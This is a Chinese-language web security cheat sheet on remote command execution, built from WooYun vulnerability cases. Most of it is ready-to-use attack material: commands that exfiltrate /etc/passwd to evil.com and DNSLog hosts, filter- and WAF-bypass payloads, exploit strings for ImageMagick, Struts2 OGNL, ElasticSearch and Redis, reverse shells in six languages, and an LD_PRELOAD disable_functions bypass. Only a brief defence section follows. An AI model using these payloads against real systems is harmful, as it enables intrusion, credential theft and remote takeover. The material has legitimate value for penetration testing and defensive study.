# Web 安全 - 命令执行（RCE）

> 来源: WooYun 漏洞库（6,826 RCE 案例）| 拆自 web-injection.md

## 三、命令执行

### 3.1 漏洞本质

```
用户输入(数据) -> 未净化拼接 -> 进入系统命令/代码执行上下文 -> OS指令执行
```

**核心公式**：命令执行 = 数据流污染 + 执行上下文（Shell/代码/表达式）

### 3.2 检测方法

#### 高频入口点

| 入口类型 | 占比 | 典型场景 |
|---------|------|---------|
| 文件操作 | 68% | 上传、读取、解压 |
| 系统命令函数 | 62% | exec/system/shell_exec |
| Struts2框架 | 50% | OGNL表达式注入 |
| SSRF | 30% | URL参数传递 |
| ping命令 | 26% | 网络诊断功能 |
| 图片处理 | 24% | ImageMagick |
| Java反序列化 | 20% | WebLogic/JBoss |

#### 命令拼接符号

| 符号 | 含义 | 执行逻辑 |
|------|------|---------|
| `;` | 分隔符 | 顺序执行，不管前命令结果 |
| `\|` | 管道 | 前输出作为后输入 |
| `` ` `` / `$()` | 命令替换 | 执行内部命令并返回结果 |
| `\|\|` | 逻辑或 | 前失败才执行后 |
| `&&` | 逻辑与 | 前成功才执行后 |
| `%0a` / `%0d%0a` | 换行 | URL编码换行分隔 |

#### 无回显检测

```bash
# DNSLog外带
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP外带
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# 时间延迟
sleep 5
ping -c 5 127.0.0.1

# 文件写入Web目录
echo "test" > /var/www/html/proof.txt
```

### 3.3 绕过技巧

#### 空格绕过

```bash
cat${IFS}/etc/passwd          # ${IFS}内部字段分隔符
cat$IFS$9/etc/passwd          # $9为空的位置参数
cat%09/etc/passwd             # Tab制表符
cat</etc/passwd               # 重定向符
{cat,/etc/passwd}             # 大括号扩展
```

#### 关键字绕过

```bash
# 引号/反斜杠分割
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量拼接
a=c;b=at;$a$b /etc/passwd

# 通配符
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat命令替代

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### 编码绕过

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 利用链与Payload

#### 框架/组件漏洞Payload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL通用命令执行**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy沙箱绕过**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis未授权写SSH公钥/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# 或写crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### 反弹Shell集合

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC无-e参数
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP危险函数层级

| 层级 | 函数 | 能力 |
|-----|------|-----|
| L1代码级 | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHP代码执行 |
| L2 Shell级 | `system()`, `passthru()`, `shell_exec()`, 反引号 | 系统命令有回显 |
| L3进程级 | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | 子进程执行 |
| L4回调级 | `call_user_func()`, `array_map()` | 间接函数调用 |

#### PHP WAF绕过技巧

```php
// 字符串拼接
$func = 'sys'.'tem'; $func('whoami');
// 变量函数
$a='sys';$b='tem';($a.$b)('whoami');
// 编码混淆
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// 字符串操作
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions绕过

| 方法 | 原理 | 条件 |
|-----|------|-----|
| LD_PRELOAD | 劫持系统库函数，mail()触发加载恶意.so | 可上传.so + mail()可用 |
| Shellshock | Bash<=4.3环境变量注入 | 旧版Bash |
| Apache Mod_CGI | .htaccess配置CGI执行 | Apache + AllowOverride |
| PHP-FPM/FastCGI | 修改PHP配置执行代码 | 可访问FPM端口/SSRF |
| ImageMagick | delegate功能命令执行 | 使用IM处理图片 |
| Windows COM | WScript.Shell组件 | Windows + COM扩展 |

**LD_PRELOAD核心利用**：

```php
// 上传恶意.so（劫持geteuid函数，内部调用system()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()启动sendmail进程 -> 加载.so -> 执行命令
```

### 3.5 防御措施

```php
// 最佳实践：白名单验证 + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- 避免直接调用系统命令，使用语言内置函数替代
- 参数化执行（数组传参），禁止字符串拼接
- `escapeshellarg()` + `escapeshellcmd()` 转义
- 白名单验证输入 + 类型检查
- `disable_functions` 禁用危险函数（注意绕过风险）
- 最小权限运行Web服务 + 容器/chroot隔离
- 及时更新框架组件（Struts2/WebLogic/ImageMagick等）

---

